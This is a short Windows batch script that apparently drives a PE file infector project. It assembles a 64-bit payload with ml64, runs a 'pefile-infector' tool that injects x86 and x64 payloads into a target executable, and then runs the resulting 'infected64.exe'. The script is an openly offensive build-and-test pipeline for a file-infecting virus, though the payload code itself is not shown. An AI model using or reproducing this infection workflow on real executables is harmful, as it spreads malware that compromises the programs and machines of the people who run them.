@echo off
echo Location: %~dp0
echo Target: %~f1

set location=%~dp0
set cwd=%cd%
set loc64=%location%\cmake-build-debug-visual-studio-x64
set loc86=%location%\cmake-build-debug-visual-studio-x86

call vcvarsall.bat x64
cd %location%\payload\dist
ml64.exe output64.asm /link /entry:AlignRSP
%loc64%\pefile-infector.exe --input %loc64%\target.exe --output %location%\workspace\infected64.exe --payload-x86 %location%\payload\dist\output86.exe --payload-x64 %location%\payload\dist\output64.exe
cd %cwd%

%location%\workspace\infected64.exe a b c d e f